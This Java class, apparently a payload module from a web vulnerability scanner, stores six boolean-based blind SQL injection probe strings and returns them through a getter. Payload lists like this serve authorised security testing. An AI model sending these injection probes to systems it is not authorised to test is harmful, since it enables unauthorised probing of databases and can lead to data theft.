/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package PayloadSignature.A3Injection;

/**
 *
 * @author shacojx
 */
public class SQLInjectionBlind {

    private static String[] arrPayBlindSQLin;

    public SQLInjectionBlind() {
        /*List Payload SQL Injection boolen*/
        arrPayBlindSQLin = new String[]{
            "1 and 1=1#",
            "1 and 1=2#",
            "1' and 1=1#",
            "1' and 1=2#",
            "1\" and 1=1#",
            "1\" and 1=2#"
        };
    }

    public String[] getArrPaySQLin() {
        return arrPayBlindSQLin;
    }
}
